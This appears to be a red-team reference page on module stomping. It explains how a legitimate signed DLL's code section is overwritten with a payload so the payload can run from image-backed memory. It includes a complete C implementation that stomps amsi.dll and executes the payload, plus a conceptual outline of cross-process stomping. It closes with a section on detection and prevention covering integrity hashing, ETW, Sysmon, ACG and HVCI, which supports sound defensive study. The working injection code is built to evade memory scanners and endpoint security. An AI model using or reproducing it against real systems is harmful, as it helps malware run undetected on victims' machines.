# Module Stomping

**MITRE ATT&CK**: T1055 - Process Injection

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

Module stomping (also called "module overloading" or "DLL hollowing") loads a
legitimate, signed DLL into a target process and then overwrites its executable code
section (.text) with a payload. The payload now executes from memory backed by a
legitimate module on disk, evading detections that look for execution from unbacked
(private) memory regions.

This technique exploits the fact that most memory scanners check whether executable
memory is "image-backed" (loaded from a file) but do not verify that the in-memory
content still matches the file on disk.

## Key Advantages Over Other Injection Methods

1. **Image-backed execution**: The memory region type is "Image" (not "Private"),
   bypassing unbacked-memory scanners.
2. **Module appears in PEB**: The stomped DLL is in the loaded module list, so
   module enumeration tools see a legitimate entry.
3. **Valid file path**: The `ImageLoaded` path points to a real, signed DLL.
4. **No RWX allocation**: The .text section already has PAGE_EXECUTE_READ; we
   temporarily change it to PAGE_READWRITE, write, then restore to PAGE_EXECUTE_READ.

## API Call Pattern

```
LoadLibraryExA (load sacrificial DLL into target process)
    --> Parse PE headers to locate .text section
    --> VirtualProtect (.text to PAGE_READWRITE)
    --> memcpy / WriteProcessMemory (overwrite .text with payload)
    --> VirtualProtect (.text back to PAGE_EXECUTE_READ)
    --> Execute (CreateRemoteThread or other trigger)
```

## C Implementation - Local Module Stomping

```c
#include <windows.h>
#include <stdio.h>

/*
 * Local module stomping: load a DLL into our own process and overwrite
 * its .text section. This is used when the goal is to execute code
 * from image-backed memory within the current process (e.g., to evade
 * in-process memory scanners or ETW stack walking).
 *
 * For cross-process injection, combine with CreateRemoteThread or
 * other remote execution primitives.
 */

// Helper: find the .text section in a loaded module
IMAGE_SECTION_HEADER* find_text_section(HMODULE hModule) {
    // Navigate PE structure: DOS header -> NT headers -> section headers
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)hModule;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;  // "MZ" check

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)
        ((BYTE *)hModule + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;  // "PE\0\0" check

    // Section headers immediately follow the optional header
    IMAGE_SECTION_HEADER *section = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        // Look for .text section (contains executable code)
        // Characteristics: IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE &&
            section[i].Characteristics & IMAGE_SCN_CNT_CODE) {
            return &section[i];
        }
    }
    return NULL;
}

int stomp_module(unsigned char *payload, SIZE_T payloadSize) {

    // ---------------------------------------------------------------
    // STEP 1: Load a "sacrificial" DLL.
    // Choose a DLL that:
    //   - Has a .text section large enough for the payload
    //   - Is not critical to the host process
    //   - Is legitimately signed (for signature-based trust)
    //
    // DONT_RESOLVE_DLL_REFERENCES prevents DllMain from executing
    // and avoids initializing the DLL's dependencies.
    // ---------------------------------------------------------------
    HMODULE hSacrificial = LoadLibraryExA(
        "C:\\Windows\\System32\\amsi.dll",  // Example sacrificial DLL
        NULL,
        DONT_RESOLVE_DLL_REFERENCES  // Load without initialization
    );
    if (!hSacrificial) {
        printf("[!] LoadLibraryExA failed: %lu\n", GetLastError());
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 2: Locate the .text section by parsing PE headers.
    // We need the section's virtual address (RVA) and size to know
    // where to write and how much space is available.
    // ---------------------------------------------------------------
    IMAGE_SECTION_HEADER *textSection = find_text_section(hSacrificial);
    if (!textSection) {
        FreeLibrary(hSacrificial);
        return -1;
    }

    // Calculate absolute address of .text section
    LPVOID textAddress = (LPVOID)((DWORD_PTR)hSacrificial +
                                   textSection->VirtualAddress);
    DWORD textSize = textSection->Misc.VirtualSize;

    // Verify payload fits in the .text section
    if (payloadSize > textSize) {
        printf("[!] Payload (%zu) exceeds .text section size (%lu)\n",
               payloadSize, textSize);
        FreeLibrary(hSacrificial);
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 3: Change .text section permissions to writable.
    // The section is normally PAGE_EXECUTE_READ. We need PAGE_READWRITE
    // to overwrite its contents. This permission change is detectable
    // but temporary.
    // ---------------------------------------------------------------
    DWORD oldProtect;
    if (!VirtualProtect(textAddress, textSize, PAGE_READWRITE, &oldProtect)) {
        printf("[!] VirtualProtect (RW) failed: %lu\n", GetLastError());
        FreeLibrary(hSacrificial);
        return -1;
    }

    // ---------------------------------------------------------------
    // STEP 4: Overwrite the .text section with our payload.
    // First zero out the entire section (clean slate), then copy payload.
    // ---------------------------------------------------------------
    memset(textAddress, 0, textSize);           // Zero out original code
    memcpy(textAddress, payload, payloadSize);  // Write payload

    // ---------------------------------------------------------------
    // STEP 5: Restore original permissions (PAGE_EXECUTE_READ).
    // This makes the section executable again and removes the writable
    // flag, reducing the detection surface.
    // ---------------------------------------------------------------
    VirtualProtect(textAddress, textSize, PAGE_EXECUTE_READ, &oldProtect);

    // ---------------------------------------------------------------
    // STEP 6: Execute the payload.
    // The payload is now at textAddress within image-backed memory.
    // Execution methods: direct call, CreateThread, callback, etc.
    // ---------------------------------------------------------------
    HANDLE hThread = CreateThread(
        NULL, 0,
        (LPTHREAD_START_ROUTINE)textAddress,
        NULL, 0, NULL
    );
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}
```

## Cross-Process Module Stomping (Concept)

```c
/*
 * For remote module stomping, the approach differs slightly:
 *
 * 1. Force the target process to load the sacrificial DLL:
 *    - Use CreateRemoteThread + LoadLibrary (but this is detectable)
 *    - Or choose a DLL that is already loaded in the target
 *
 * 2. Find the .text section in the remote process:
 *    - Read the remote PE headers via ReadProcessMemory
 *    - Parse section headers to locate .text RVA
 *
 * 3. Overwrite remotely:
 *    - VirtualProtectEx to make .text writable in remote process
 *    - WriteProcessMemory to overwrite with payload
 *    - VirtualProtectEx to restore PAGE_EXECUTE_READ
 *
 * 4. Trigger execution:
 *    - CreateRemoteThread at the stomped .text address
 *    - Or QueueUserAPC, or thread hijacking
 *
 * The key benefit: the thread start address resolves to a known
 * module's .text section, not to unbacked memory.
 */
```

## Detection & Prevention

### Module Integrity Verification

The primary detection for module stomping is comparing the in-memory .text section
against the on-disk DLL file. If the bytes differ, the module has been tampered with.

**Hash comparison approach**:
1. Enumerate all loaded modules in a process (via PEB or ToolHelp32)
2. For each module, read the on-disk file and the in-memory image
3. Hash the .text section from both sources
4. If hashes differ, the module has been stomped

```
For each loaded module:
    disk_hash = SHA256(disk_file.text_section)
    mem_hash  = SHA256(process_memory.text_section)
    if disk_hash != mem_hash:
        ALERT: Module stomping detected in {module_name}
```

**Tools that implement this**:
- **Pe-sieve**: Scans processes for module tampering, including .text section
  modifications. The `--shellc` flag specifically looks for shellcode in stomped modules.
- **Moneta**: Memory scanner that identifies modified image-backed sections.
- **Volatility `malfind`**: Can detect modified sections through VAD analysis,
  though it primarily focuses on unbacked regions.

### VirtualProtect Monitoring

The temporary permission change (RX -> RW -> RX) on a module's .text section is
detectable:

- **ETW**: The Microsoft-Windows-Kernel-Memory provider logs VirtualProtect calls.
  A .text section permission change from EXECUTE_READ to READWRITE is abnormal.
- **EDR hooks**: NtProtectVirtualMemory hooks detect permission changes on
  image-backed regions. Legitimate software rarely modifies loaded module permissions.

### Behavioral Indicators

1. **LoadLibraryExA with DONT_RESOLVE_DLL_REFERENCES**: This flag is unusual in
   legitimate software. It loads the DLL without initialization, which is a strong
   indicator of module stomping preparation.

2. **Execution from modified module**: Advanced EDRs maintain a record of module
   integrity. Threads executing from a module whose .text hash has changed since
   load time are flagged.

3. **DLL load without corresponding DllMain execution**: If a DLL is loaded with
   DONT_RESOLVE_DLL_REFERENCES, DllMain never fires. EDRs that expect DllMain
   execution for every loaded module can detect this anomaly.

### Sysmon Detection

- **Event ID 7 (ImageLoad)**: The sacrificial DLL load is logged. Detection can
  correlate unusual DLL loads (rarely loaded modules, or loads from processes that
  do not normally load that module) with subsequent suspicious activity.
- **Event ID 10 (ProcessAccess)**: For cross-process stomping, the handle access
  to the target process is logged.

### Prevention

- **Hypervisor-protected Code Integrity (HVCI)**: Prevents modification of
  code pages in kernel mode. In user mode, HVCI-aware policies can restrict
  VirtualProtect on image-backed executable regions.
- **Arbitrary Code Guard (ACG)**: Prevents modification of existing executable
  code pages in protected processes. This directly blocks the VirtualProtect
  call that makes .text writable.
- **Code Integrity Guard**: Validates module signatures at load time, though
  this does not prevent post-load modification.
- **Periodic integrity scanning**: Security products that periodically hash
  loaded module .text sections and compare against on-disk versions.
